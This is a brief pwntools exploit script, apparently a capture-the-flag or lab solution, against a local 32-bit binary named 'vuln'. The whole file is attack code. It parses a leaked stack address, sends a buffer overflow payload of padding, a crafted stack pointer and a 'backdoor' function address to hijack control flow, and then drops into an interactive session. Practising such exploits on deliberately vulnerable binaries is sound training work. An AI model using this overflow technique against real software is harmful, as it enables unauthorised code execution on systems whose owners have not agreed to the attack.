from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p = process("./vuln")
backdoor_addr = 0x080491b6
p.recvuntil("stack addr at: ")
stack_addr = int(p.recvline().strip(), 16)
log.info("stack addr: " + hex(stack_addr))
rcx_addr = stack_addr + 0x30
gdb.attach(p)
pause()
p.recvuntil("Enter your input: ")
p.sendline(b"a"*0x20 + p32(rcx_addr) + p64(0) + p32(backdoor_addr))
p.interactive()